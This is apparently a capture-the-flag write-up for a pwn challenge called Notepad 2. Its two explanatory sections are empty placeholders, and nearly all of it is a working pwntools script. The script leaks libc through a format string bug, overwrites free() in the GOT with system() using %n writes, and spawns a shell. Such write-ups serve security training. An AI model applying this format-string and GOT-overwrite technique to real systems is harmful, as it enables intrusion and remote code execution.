# 1337 Up | Notepad 2 - PWN (162)

This challenge involves exploiting a format string vulnerability to leak `libc_start_main` and overwrite an address in the Global Offset Table (GOT) to the address of `system`. After doing that you can call `system('/bin/sh')`.

## Initial Analysis
How to get the building blocks of ideas for exploitation

## Exploitation
How to exploit after initial analysis

## Solve
``` python
from pwn import *

BINARY = './notepad2'
HOST = '192.168.1.1:6000'
GDB_SCRIPT = ''

def add_note(proc, index, data):
    proc.sendlineafter(b'> ', b'1')
    proc.sendlineafter(b'> ', index)
    proc.sendlineafter(b'> ', data)

def view_note(proc, index):
    proc.sendlineafter(b'> ', b'2')
    proc.sendlineafter(b'> ', index)

def del_note(proc, index):
    proc.sendlineafter(b'> ', b'3')
    proc.sendlineafter(b'> ', index)

def main():
    proc = get_process() # set is_remote = False for local testing
    
    # Leak __libc_start_main address
    add_note(proc, b'1', b'%13$p')
    view_note(proc, b'1')
    
    # Calculate libc base address
    libc_start_main_leak = proc.recvline().strip().decode()
    libc_start_main_address = 0x028150
    libc_base = int(libc_start_main_leak, 16) - libc_start_main_address
    
    # Calculate system() address
    system_address = 0x552b0
    system = libc_base + system_address
    
    # Calculate the amount of data that needs to be written with format string exploit
    two_bytes = int(hex(system)[-4:],16)
    last_byte = int(hex(system)[-6:-4], 16)
    
    # Will initialize free() address in GOT table
    del_note(proc, b'1')
    
    # Replace the address of free() with system() in GOT
    add_note(proc, b'2', b'%4210688c%8$n')
    view_note(proc, b'2')
    add_note(proc, b'3', f'%{two_bytes}c%12$hn'.encode())
    view_note(proc, b'3')
    add_note(proc, b'4', b'%4210690c%8$n')
    view_note(proc, b'4')
    add_note(proc, b'5', f'%{last_byte}c%12$hhn'.encode())
    view_note(proc, b'5')
    
    # Call system('/bin/sh') by deleting note (free is replaced with system)
    add_note(proc, b'6', b'/bin/sh')
    del_note(proc, b'6')
    
    print('Fetching shell...')
    proc.interactive()

# Allows compatibility if custom library isn't present
try:
    from ctfkit.bp import *
    tpwn.GDB_SCRIPT = GDB_SCRIPT
except ImportError:
    def get_process(is_remote=True):
        host, port = HOST.split(':')
        return remote(host, int(port)) if is_remote else process()

if __name__ == '__main__':
    try:
        context.binary = BINARY
    except FileNotFoundError:
        print('Not able to load binary, local testing disabled')
    context.log_level = 'error'
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

    parse_args()
    main()
```